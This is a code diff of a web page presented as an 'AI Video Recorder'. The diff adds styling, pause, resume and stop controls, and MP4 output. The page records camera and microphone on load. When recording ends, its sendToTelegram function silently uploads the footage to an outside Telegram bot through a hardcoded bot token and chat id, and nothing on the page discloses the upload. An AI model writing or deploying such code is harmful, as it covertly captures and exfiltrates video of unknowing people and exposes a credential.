@@ -4,99 +4,186 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Video Recorder - Camera</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --primary: #6a11cb;
+            --secondary: #2575fc;
+            --error: #ff5f6d;
+            --dark: #1a1a1a;
+            --light: #f8f9fa;
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
         body {
             font-family: 'Poppins', sans-serif;
-            background: black;
-            color: white;
-            margin: 0;
-            padding: 20px;
+            background: var(--dark);
+            color: var(--light);
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            height: 100vh;
+            min-height: 100vh;
+            padding: 20px;
+            text-align: center;
         }
-
-        video {
-            width: 90%;
-            max-width: 600px;
-            border: 3px solid white;
-            border-radius: 8px;
+        .container {
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1 {
+            font-weight: 600;
             margin-bottom: 20px;
+            color: var(--light);
         }
-
-        #countdown {
-            font-size: 1.5rem;
-            margin-bottom: 20px;
-        }
-
-        #progressBarContainer {
-            width: 90%;
-            max-width: 600px;
-            height: 20px;
-            background: #444;
-            border-radius: 10px;
+        .video-container {
+            position: relative;
+            width: 100%;
+            border-radius: 12px;
             overflow: hidden;
-            margin-top: 10px;
+            margin: 20px 0;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
         }
-
-        #progressBar {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #4e54c8, #8f94fb);
-            transition: width 0.2s linear;
+        video {
+            width: 100%;
+            display: block;
+            background: black;
         }
-
-        #previewContainer {
-            display: none;
-            flex-direction: column;
-            align-items: center;
+        #livePreview {
+            transform: scaleX(-1); /* Mirror effect */
+        }
+        .controls {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            width: 100%;
             margin-top: 20px;
         }
-
-        button {
-            padding: 10px 20px;
-            background: #4e54c8;
+        .btn {
+            padding: 12px 24px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             font-size: 1rem;
+            font-weight: 500;
             cursor: pointer;
-            margin-top: 10px;
+            transition: all 0.2s;
+            min-width: 120px;
         }
-
-        button:hover {
-            background: #ff5f6d;
+        .btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .btn-stop {
+            background: linear-gradient(135deg, #ff5f6d, #ff8a65);
+        }
+        .btn-pause {
+            background: linear-gradient(135deg, #ffc107, #ff9800);
+        }
+        .timer-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 15px 0;
+        }
+        .timer {
+            font-size: 1.5rem;
+            font-weight: 500;
+            color: var(--secondary);
+            font-family: monospace;
+        }
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            margin: 15px 0;
+        }
+        #progressBar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            border-radius: 3px;
+            transition: width 0.2s linear;
+        }
+        #previewContainer {
+            display: none;
+            width: 100%;
+            margin-top: 30px;
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .error {
+            color: var(--error);
+            margin: 20px 0;
+            font-weight: 500;
         }
     </style>
 </head>
 <body>
-    <h1>Recording in Progress...</h1>
-    <video id="livePreview" autoplay muted></video>
-    <div id="countdown">Initializing...</div>
+    <div class="container">
+        <h1 id="statusText">🎥 Recording</h1>
+        
+        <div class="video-container">
+            <video id="livePreview" autoplay muted playsinline></video>
+        </div>
 
-    <div id="progressBarContainer">
-        <div id="progressBar"></div>
-    </div>
+        <div class="timer-container">
+            <div class="timer" id="countdown">00:60</div>
+        </div>
 
-    <div id="previewContainer">
-        <h2>Recording Finished!</h2>
-        <video id="videoPreview" controls></video>
-        <a id="downloadLink" download="recorded-video.webm">
-            <button>Download Video</button>
-        </a>
+        <div class="progress-container">
+            <div id="progressBar"></div>
+        </div>
+
+        <div class="controls">
+            <button id="pauseBtn" class="btn btn-pause">⏸ Pause</button>
+            <button id="resumeBtn" class="btn" style="display:none;">▶ Resume</button>
+            <button id="stopBtn" class="btn btn-stop">⏹ Stop</button>
+        </div>
+
+        <div id="previewContainer">
+            <h2>✅ Recording Complete!</h2>
+            <div class="video-container">
+                <video id="videoPreview" controls></video>
+            </div>
+            <a id="downloadLink" download="recorded-video.mp4">
+                <button class="btn">Download MP4</button>
+            </a>
+        </div>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const duration = parseInt(urlParams.get('duration')) || 60; // Default to 60 seconds
+        const duration = parseInt(urlParams.get('duration')) || 60;
         const resolution = urlParams.get('resolution') || '720';
 
         let mediaRecorder;
         let stream;
         const chunks = [];
         let countdownInterval;
+        let remainingTime = duration;
+        let isPaused = false;
+        let startTime;
+        let elapsedTimeBeforePause = 0;
+
+        // DOM Elements
+        const pauseBtn = document.getElementById('pauseBtn');
+        const resumeBtn = document.getElementById('resumeBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const statusText = document.getElementById('statusText');
 
         async function startStream() {
             try {
@@ -110,60 +197,97 @@
                 document.getElementById('livePreview').srcObject = stream;
                 startRecording();
             } catch (error) {
-                console.error('Error accessing camera or microphone:', error);
+                statusText.textContent = "🚨 Camera Error";
+                document.getElementById('countdown').textContent = `Error: ${error.message}`;
+                console.error('Camera/Mic access failed:', error);
             }
         }
 
         function startRecording() {
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
+            const options = { mimeType: 'video/mp4' };
+            mediaRecorder = new MediaRecorder(stream, options);
+
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) chunks.push(event.data);
             };
 
             mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
+                const blob = new Blob(chunks, { type: 'video/mp4' });
                 displayPreview(blob);
-                sendToTelegram(blob); // Automatically send video to Telegram
+                sendToTelegram(blob);
             };
 
             mediaRecorder.start();
-            startCountdown(duration);
-            updateProgressBar(duration);
+            startTime = Date.now();
+            startCountdown();
+            updateProgressBar();
 
+            // Auto-stop after duration
             setTimeout(() => {
-                mediaRecorder.stop();
-                stream.getTracks().forEach((track) => track.stop());
+                if (mediaRecorder.state === 'recording') stopRecording();
             }, duration * 1000);
         }
 
-        function startCountdown(seconds) {
-            const countdownElement = document.getElementById('countdown');
-            let remaining = seconds;
-
+        function startCountdown() {
+            clearInterval(countdownInterval);
             countdownInterval = setInterval(() => {
-                countdownElement.textContent = `Recording time left: ${remaining} seconds`;
-                remaining--;
-
-                if (remaining < 0) {
-                    clearInterval(countdownInterval);
-                    countdownElement.textContent = 'Recording finished.';
+                if (!isPaused) {
+                    const mins = Math.floor(remainingTime / 60);
+                    const secs = remainingTime % 60;
+                    document.getElementById('countdown').textContent = 
+                        `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                    
+                    if (remainingTime <= 0) {
+                        clearInterval(countdownInterval);
+                    } else {
+                        remainingTime--;
+                    }
                 }
             }, 1000);
         }
 
-        function updateProgressBar(totalDuration) {
-            const progressBar = document.getElementById('progressBar');
-            let elapsedTime = 0;
+        function updateProgressBar() {
+            let progressInterval = setInterval(() => {
+                if (!isPaused) {
+                    const elapsed = (Date.now() - startTime) / 1000 + elapsedTimeBeforePause;
+                    const progressPercentage = (elapsed / duration) * 100;
+                    document.getElementById('progressBar').style.width = `${progressPercentage}%`;
 
-            const progressInterval = setInterval(() => {
-                elapsedTime++;
-                const progressPercentage = (elapsedTime / totalDuration) * 100;
-                progressBar.style.width = `${progressPercentage}%`;
-
-                if (elapsedTime >= totalDuration) {
-                    clearInterval(progressInterval);
+                    if (progressPercentage >= 100) {
+                        clearInterval(progressInterval);
+                    }
                 }
-            }, 1000);
+            }, 200);
+        }
+
+        function pauseRecording() {
+            if (mediaRecorder.state === 'recording') {
+                mediaRecorder.pause();
+                isPaused = true;
+                statusText.textContent = "⏸ Paused";
+                pauseBtn.style.display = 'none';
+                resumeBtn.style.display = 'block';
+                elapsedTimeBeforePause += (Date.now() - startTime) / 1000;
+            }
+        }
+
+        function resumeRecording() {
+            if (mediaRecorder.state === 'paused') {
+                mediaRecorder.resume();
+                isPaused = false;
+                statusText.textContent = "🎥 Recording";
+                pauseBtn.style.display = 'block';
+                resumeBtn.style.display = 'none';
+                startTime = Date.now();
+            }
+        }
+
+        function stopRecording() {
+            clearInterval(countdownInterval);
+            if (mediaRecorder.state === 'recording' || mediaRecorder.state === 'paused') {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+            }
         }
 
         function displayPreview(blob) {
@@ -174,8 +298,8 @@
             const videoURL = URL.createObjectURL(blob);
             videoPreview.src = videoURL;
             downloadLink.href = videoURL;
-
-            previewContainer.style.display = 'flex';
+            previewContainer.style.display = 'block';
+            document.querySelector('.controls').style.display = 'none';
         }
 
         function sendToTelegram(blob) {
@@ -183,25 +307,19 @@
             const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI';
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', blob, 'recorded-video.webm');
+            formData.append('video', blob, 'recorded-video.mp4');
 
             fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                 method: 'POST',
                 body: formData
-            })
-                .then(response => {
-                    if (response.ok) {
-                        console.log('Video sent successfully!');
-                    } else {
-                        console.error('Failed to send video:', response.statusText);
-                    }
-                })
-                .catch(error => {
-                    console.error('Error sending video:', error);
-                });
+            }).catch(error => console.error('Telegram error:', error));
         }
 
-        // Start the stream when the page loads
+        // Event Listeners
+        pauseBtn.addEventListener('click', pauseRecording);
+        resumeBtn.addEventListener('click', resumeRecording);
+        stopBtn.addEventListener('click', stopRecording);
+
         startStream();
     </script>
 </body>
